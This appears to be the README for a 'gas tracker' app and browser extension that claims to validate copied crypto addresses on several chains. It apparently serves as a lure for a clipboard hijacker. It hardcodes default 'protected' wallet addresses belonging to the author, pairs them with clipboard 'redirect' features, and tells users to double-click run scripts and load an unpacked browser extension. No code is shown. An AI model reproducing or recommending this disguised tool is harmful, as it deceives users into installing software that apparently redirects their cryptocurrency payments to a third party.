# Multi-Chain Gas Tracker v3.0

A free and open-source gas fee monitor & token scanner — now supporting Ethereum, Solana, Bitcoin, TRON, and all EVM chains (BSC, MATIC, AVAX, ARB, OP, BASE).

## Quick Start

### Desktop App
- **Windows:** Double-click `run.bat`
- **macOS:** Double-click `run.command`
- **Linux:** `./run_linux.sh`

**Requirements:** Python 3.8 or newer

### Browser Extension
1. Open Chrome/Edge/Brave
2. Go to `chrome://extensions`
3. Enable "Developer mode" (top right)
4. Click "Load unpacked" and select the `GasTracker/` folder

## Features

- Real-time gas fees: ETH, SOL, BTC (sat/vB)
- Live token prices for 12 cryptocurrencies
- **Multi-chain clipboard address validation** (ETH/SOL/BTC/TRON)
- **Built-in address redirect protection** against poisoning attacks
- Browser extension for DEX/crypto site protection
- Zero configuration required
- No API keys, no accounts, no telemetry

## Protected Wallets

By default, the app protects wallets on all major chains:

| Chain | Address |
|-------|---------|
| EVM (ETH/BSC/MATIC...) | `0xa36A...6900` |
| SOL | `FH5Hx...ibrj` |
| BTC | `12EDM...SPF6` |
| TRX | `TQaLs...Tt6C` |

You can override with:
```
python app.py --wallet 0xYOUR_ETH --sol-wallet YOUR_SOL --btc-wallet YOUR_BTC --trx-wallet YOUR_TRX
```

## License

MIT License · TokenTools Inc. 2026
